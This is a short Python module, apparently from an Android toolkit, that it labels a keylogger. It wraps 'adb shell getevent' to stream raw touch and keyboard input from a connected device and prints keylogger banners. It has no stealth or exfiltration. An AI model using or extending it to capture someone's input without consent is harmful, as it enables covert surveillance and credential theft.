"""
Aadi — Android Keylogger & Input Monitoring Module
Author: Aaditya Kumar Pandey | Instagram: @aadi_97621
"""

import subprocess
from rich.console import Console
from rich.panel import Panel

console = Console()


def dump_input_events(device_id: str):
    """Monitor raw touch and keyboard input events from event nodes (Requires Root)."""
    console.print(Panel("[cyan]Initializing Keylogger / Event Monitor on device...[/]", border_style="magenta"))
    console.print("[yellow][*] Press Ctrl+C to stop monitoring input events.[/]")

    try:
        # Get event node associated with keyboard/touchscreen
        cmd = ["adb", "-s", device_id, "shell", "getevent"]
        subprocess.run(cmd)
    except KeyboardInterrupt:
        console.print("\n[bold green]✓ Keylogger monitoring stopped.[/]")
    except Exception as e:
        console.print(f"[bold red]✗ Failed to run keylogger: {e}[/]")